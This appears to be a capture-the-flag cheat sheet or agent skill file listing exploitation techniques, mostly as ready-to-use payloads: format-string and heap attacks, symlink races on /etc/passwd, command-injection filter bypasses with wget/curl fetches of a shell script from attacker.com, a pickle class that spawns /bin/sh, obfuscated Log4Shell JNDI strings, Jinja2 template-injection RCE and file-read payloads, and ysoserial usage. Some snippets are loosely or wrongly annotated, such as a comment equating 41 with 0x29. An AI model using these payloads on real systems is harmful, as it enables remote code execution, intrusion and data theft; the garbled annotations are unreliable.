# CTF Skill: Specific Techniques

## Purpose
Advanced and specific CTF exploitation techniques.

## Format String Exploitation

### Concept
```
User input directly passed to format function:
printf(user_input)  // Vulnerable
printf("%s", user_input)  // Safe
```

### Exploitation
```python
# Leak stack data
%08x  # 8-char hex
%08x %08x %08x %08x  # Multiple values
%p %p %p %p  # Pointers
%s %s %s %s  # Strings
%lx %lx %lx  # Long hex

# Leak specific stack position
%N$x  # Leak N+1th argument
# %7$x leaks 7th stack argument

# Write primitives
%n  # Write byte count to address
%hhn # Write single byte
%hn  # Write 2 bytes
```

### Format String Write
```python
# Target: Write 0x41414141 to 0x08040000
# Offset: 7 (before our string)

# Simple approach
payload = p32(0x08040000)  # Target address
payload += b'%41x'          # Write 41 (0x29) bytes
payload += b'%7$n'          # Write to 7th argument

# For larger values
payload = p32(target) + p32(target+1) + p32(target+2) + p32(target+3)
# Use %hhn to write each byte separately
```

### Advanced Techniques
```python
# Direct parameter access
%7$x  # Access 7th argument
%7$x%8$x  # Combine multiple

# Width specifier for larger writes
payload = b'%4195668x'  # Write 4195668 bytes (~4MB)
```

## Heap Exploitation

### Heap Basics
```python
# Pwntools heap analysis
from pwn import *
context.arch = 'i386'

io = process('./heap_challenge')
gdb.attach(io, '''
    break malloc
    break free
''')
```

### Fastbin Attack
```python
# Fastbin dup - same size
free(chunk0)
free(chunk1)
free(chunk0)  # Now fastbin[0] points to chunk0

# Allocate at controlled address
alloc(2, p64(target_address))
```

### Unsorted Bin Attack
```python
# Overwrite global_max_fast
# Point to target address
# Next allocation writes main_arena address
```

### House of Spirit
```python
# Overwrite stack variable
payload = b'A' * offset
payload += p64(fake_chunk_addr)
payload += p64(size)  # Size must be in fastbin range

free(fake_ptr)  # Returns chunk
# Allocate to get control
```

### House of Force
```python
# Overflow top chunk size
payload = b'A' * offset
payload += p64(0xffffffffffffffff)  # Size = -1

# Allocate large size to move top chunk
# Request size that places it at target
alloc(target_addr - top_chunk_addr, b'B' * 8)

# Allocate at target
alloc(0x100, shellcode)
```

## Race Conditions

### TOCTOU (Time-of-Check Time-of-Use)
```bash
# Symbolic link race
ln -sf /etc/passwd /tmp/passwd
./vulnerable_program /tmp/passwd

# Multiple invocations
for i in {1..100}; do
    ./vulnerable &
done
```

### Race Condition Patterns
```python
# Check-then-act
if check():  # Check
    act()  # Use - race window

# Example: Check file before writing
if not exists(path):
    create(path)  # TOCTOU - symlink attack
```

## Integer Overflow

### Concepts
```
32-bit signed max: 0x7FFFFFFF = 2147483647
32-bit unsigned max: 0xFFFFFFFF = 4294967295
Overflow: value + 1 = 0
Underflow: value - 1 = max
```

### Exploitation
```c
// Vulnerable code
int size = user_input;
int total = size + 10;
char *buf = malloc(total);

// If size = 0x7FFFFFFF, total becomes 9 (32-bit signed)
// If size = 0xFFFFFFFF, total becomes 9 (32-bit unsigned)
```

### Payloads
```python
# Integer overflow
payload = p32(0xFFFFFFFF)
payload = p32(0x7FFFFFFF)

# Size confusion
size = -1  # Becomes large unsigned
```

## Command Injection

### Filter Bypass
```bash
# Space bypass
${IFS}
$IFS
{cat,/etc/passwd}

# No spaces
{printf,"\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"}|sh

# Alternative commands
wget https://attacker.com/shell.sh
curl -o /tmp/shell.sh https://attacker.com/shell.sh
```

### Character Filters
```bash
# No special chars
$(printf "ls")
`printf "ls"`

# Variable expansion
echo $SHELL
${PATH}
${PWD}

# Hex encoding
$(echo -e "\x2f\x65\x74\x63")
```

## Python Pickle Exploitation

### Basic Exploit
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('/bin/sh',))

# Encode
payload = base64.b64encode(pickle.dumps(RCE()))

# Send to victim
# Victim does: pickle.loads(base64.b64decode(payload))
```

### ROP Chain via Pickle
```python
import pickle
import base64

class Exploit:
    def __reduce__(self):
        # Return arbitrary function
        import subprocess
        return (subprocess.check_output, (['cat', '/flag'],))

payload = base64.b64encode(pickle.dumps(Exploit()))
```

## JNDI Injection

### LDAP/RMI Injection
```java
// Vulnerable lookup
ctx.lookup(request.getParameter("uri"));

// Payloads
${jndi:ldap://attacker.com/Exploit}
${jndi:rmi://attacker.com/Exploit}
```

### Log4Shell Pattern
```
${jndi:ldap://attacker.com/Exploit}
${${env:ENV_VAR:-j}ndi:${env:LOL:-l}dap://...}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://...}
```

## Template Injection

### Jinja2 SSTI
```python
# Basic
{{ config }}
{{ request }}
{{ ''.__class__.__mro__[1].__subclasses__() }}

# RCE
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# File read
{{ ''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['open']('/etc/passwd').read() }}
```

### PHP SSTI
```php
<?php
// Twig
{{ _self }}
{{ _self.getTemplateFromString(payload) }}

// Smarty
{php}system('id');{/php}
```

## Deserialization Gadgets

### Java
```java
// Gadget chain: TemplatesImpl
// Requires: _bytecodes field set
// Trigger: readObject()

// ysoserial payload
java -jar ysoserial.jar CommonsCollections6 "command"
```

### .NET
```csharp
// BinaryFormatter Deserialize
// Gadget chain: ObjectDataProvider + ExpandedWrapper
```

### Ruby
```ruby
# YAML.load vulnerable
YAML.load(user_input)
```

## Checklist
```
[ ] Identify vulnerability type
[ ] Determine exploitation method
[ ] Calculate offsets/addresses
[ ] Build payload
[ ] Test locally
[ ] Adjust for remote
[ ] Get flag
```
